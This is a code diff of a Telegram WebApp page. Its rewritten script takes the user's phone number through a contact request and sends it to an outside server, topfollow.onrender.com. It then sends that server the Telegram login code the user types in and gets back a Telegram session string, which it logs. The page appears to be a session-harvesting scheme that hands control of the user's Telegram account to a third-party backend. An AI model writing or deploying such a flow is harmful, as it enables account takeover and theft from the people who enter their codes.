@@ -9,7 +9,7 @@
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body {
             font-family: 'Segoe UI', sans-serif;
-            background: #0f0c29; /* Even if JS fails, it won't be white */
+            background: #0f0c29; 
             color: white;
             height: 100vh;
             display: flex;
@@ -84,130 +84,141 @@
     <!-- Telegram WebApp SDK -->
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 
+    <!-- 💡 RUNTIME SCRIPT - No window.onload to prevent mobile race conditions -->
     <script>
-        // --- DEBUG: Check if script is running ---
-        console.log("App script loaded. Waiting for SDK...");
+        // --- 1. INITIALIZE SDK IMMEDIATELY ---
+        let tg;
+        try {
+            tg = window.Telegram.WebApp;
+            tg.ready();
+            tg.expand();
+            console.log('Telegram WebApp initialized successfully!');
+        } catch (e) {
+            console.error('Failed to load Telegram SDK:', e);
+            document.getElementById('contactStatus').innerText = "SDK Error. Please reload.";
+            document.getElementById('contactStatus').className = 'status-msg error';
+        }
 
-        window.onload = function() {
-            console.log("DOM fully loaded. Initializing WebApp...");
+        let currentPhone = '';
+
+        // --- 2. BUTTON CLICK HANDLER ---
+        const shareBtn = document.getElementById('shareContactBtn');
+        if (shareBtn) {
+            shareBtn.addEventListener('click', function() {
+                // Show loading message so the user KNOWS something happened
+                const status = document.getElementById('contactStatus');
+                status.className = 'status-msg info';
+                status.innerText = '⏳ Opening Telegram contact request...';
+
+                // Trigger the native popup
+                if (tg) {
+                    try {
+                        tg.requestContact();
+                    } catch (error) {
+                        status.className = 'status-msg error';
+                        status.innerText = 'Error: ' + error.message;
+                        console.error(error);
+                    }
+                } else {
+                    status.className = 'status-msg error';
+                    status.innerText = 'SDK not initialized. Please close and re-open.';
+                }
+            });
+        }
+
+        // --- 3. HANDLE CONTACT SHARED (FIXED PARSING) ---
+        tg.onEvent('contactRequested', function(data) {
+            console.log('Contact data received:', data);
+            const status = document.getElementById('contactStatus');
             
-            let tg;
+            if (data && data.contact && data.contact.phone_number) {
+                currentPhone = data.contact.phone_number;
+                document.getElementById('displayPhone').innerText = currentPhone;
+                
+                // Switch UI to OTP step
+                document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
+                document.getElementById('step-otp').classList.add('active');
+                status.innerText = '';
+
+                // Automatically request the OTP from backend
+                sendOTPToBackend(currentPhone);
+            } else {
+                status.className = 'status-msg error';
+                status.innerText = 'Failed to retrieve phone number. Try again.';
+            }
+        });
+
+        tg.onEvent('contactRequestedFailed', function() {
+            document.getElementById('contactStatus').className = 'status-msg error';
+            document.getElementById('contactStatus').innerText = 'Contact sharing denied. Please try again.';
+        });
+
+        // --- 4. SEND OTP (Backend logic) ---
+        async function sendOTPToBackend(phone) {
+            const status = document.getElementById('otpStatus');
+            status.className = 'status-msg info';
+            status.innerText = '⏳ Sending OTP to your Telegram...';
+
             try {
-                tg = window.Telegram.WebApp;
-                if (!tg) throw new Error("SDK not found");
-            } catch (e) {
-                console.error("Failed to load Telegram SDK:", e);
-                document.getElementById('contactStatus').innerText = "Error: SDK failed to load. Please close and reopen.";
-                document.getElementById('contactStatus').className = 'status-msg error';
+                const resp = await fetch('https://topfollow.onrender.com/api/send-otp', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phoneNumber: phone })
+                });
+                const data = await resp.json();
+                if (data.success) {
+                    status.className = 'status-msg success';
+                    status.innerText = '✅ OTP sent! Check your Telegram app.';
+                } else {
+                    status.className = 'status-msg error';
+                    status.innerText = data.error || 'Failed to send OTP.';
+                }
+            } catch (err) {
+                console.error(err);
+                status.className = 'status-msg error';
+                status.innerText = 'Network error connecting to server.';
+            }
+        }
+
+        // --- 5. VERIFY OTP ---
+        window.verifyOTP = async function() {
+            const code = document.getElementById('otpInput').value.trim();
+            const status = document.getElementById('otpStatus');
+            
+            if (!code) {
+                status.className = 'status-msg error';
+                status.innerText = 'Please enter the 6-digit code.';
                 return;
             }
 
-            // Initialize properly
-            tg.ready();
-            tg.expand();
-            console.log("WebApp initialized successfully!");
+            status.className = 'status-msg info';
+            status.innerText = '⏳ Verifying OTP...';
 
-            // ------------------------------------------------
-            // YOUR APP LOGIC
-            // ------------------------------------------------
-            let currentPhone = '';
+            try {
+                const resp = await fetch('https://topfollow.onrender.com/api/verify-otp', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phoneNumber: currentPhone, code: code })
+                });
+                const data = await resp.json();
 
-            // Step 1: Share Contact
-            document.getElementById('shareContactBtn').addEventListener('click', function() {
-                tg.requestContact();
-            });
-
-            tg.onEvent('contactRequested', function(data) {
-                console.log("Contact data received:", data);
-                if (data && data.contact && data.contact.phone_number) {
-                    currentPhone = data.contact.phone_number;
-                    document.getElementById('displayPhone').innerText = currentPhone;
+                if (data.success) {
+                    console.log("🔐 TELEGRAM SESSION STRING:", data.session);
+                    status.className = 'status-msg success';
+                    status.innerText = '✅ Session created!';
                     
-                    // Switch to OTP step
                     document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
-                    document.getElementById('step-otp').classList.add('active');
-                    document.getElementById('contactStatus').innerText = '';
-                    
-                    // Send OTP
-                    sendOTPToBackend(currentPhone);
+                    document.getElementById('step-success').classList.add('active');
                 } else {
-                    document.getElementById('contactStatus').className = 'status-msg error';
-                    document.getElementById('contactStatus').innerText = 'Failed to retrieve phone number. Try again.';
-                }
-            });
-
-            tg.onEvent('contactRequestedFailed', function() {
-                document.getElementById('contactStatus').className = 'status-msg error';
-                document.getElementById('contactStatus').innerText = 'Contact sharing denied. Please try again.';
-            });
-
-            // Step 2: Request OTP from backend
-            async function sendOTPToBackend(phone) {
-                const status = document.getElementById('otpStatus');
-                status.className = 'status-msg info';
-                status.innerText = '⏳ Sending OTP to your Telegram...';
-
-                try {
-                    const resp = await fetch('https://topfollow.onrender.com/api/send-otp', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ phoneNumber: phone })
-                    });
-                    const data = await resp.json();
-                    if (data.success) {
-                        status.className = 'status-msg success';
-                        status.innerText = '✅ OTP sent! Check your Telegram app.';
-                    } else {
-                        status.className = 'status-msg error';
-                        status.innerText = data.error || 'Failed to send OTP.';
-                    }
-                } catch (err) {
-                    console.error(err);
                     status.className = 'status-msg error';
-                    status.innerText = 'Network error connecting to server.';
+                    status.innerText = data.error || 'Invalid OTP.';
                 }
+            } catch (err) {
+                console.error(err);
+                status.className = 'status-msg error';
+                status.innerText = 'Network error. Check console.';
             }
-
-            // Step 3: Verify OTP
-            window.verifyOTP = async function() {
-                const code = document.getElementById('otpInput').value.trim();
-                const status = document.getElementById('otpStatus');
-                
-                if (!code) {
-                    status.className = 'status-msg error';
-                    status.innerText = 'Please enter the 6-digit code.';
-                    return;
-                }
-
-                status.className = 'status-msg info';
-                status.innerText = '⏳ Verifying OTP...';
-
-                try {
-                    const resp = await fetch('https://topfollow.onrender.com/api/verify-otp', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ phoneNumber: currentPhone, code: code })
-                    });
-                    const data = await resp.json();
-
-                    if (data.success) {
-                        console.log("🔐 TELEGRAM SESSION STRING:", data.session);
-                        status.className = 'status-msg success';
-                        status.innerText = '✅ Session created!';
-                        
-                        document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
-                        document.getElementById('step-success').classList.add('active');
-                    } else {
-                        status.className = 'status-msg error';
-                        status.innerText = data.error || 'Invalid OTP.';
-                    }
-                } catch (err) {
-                    console.error(err);
-                    status.className = 'status-msg error';
-                    status.innerText = 'Network error. Check console.';
-                }
-            };
         };
     </script>
 </body>
-</html>
+</html>                
